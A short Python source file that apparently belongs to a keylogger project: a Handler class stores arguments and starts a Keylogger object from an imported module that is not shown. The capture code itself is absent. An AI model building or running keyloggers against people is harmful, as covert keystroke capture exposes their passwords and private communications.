import logger

# TODO separate the handler's args from the keylogger args
class Handler:
    def __init__(self, args):
        self.args = args

    def start_logger(self):
        kl = logger.Keylogger(self.args)
        kl.start()
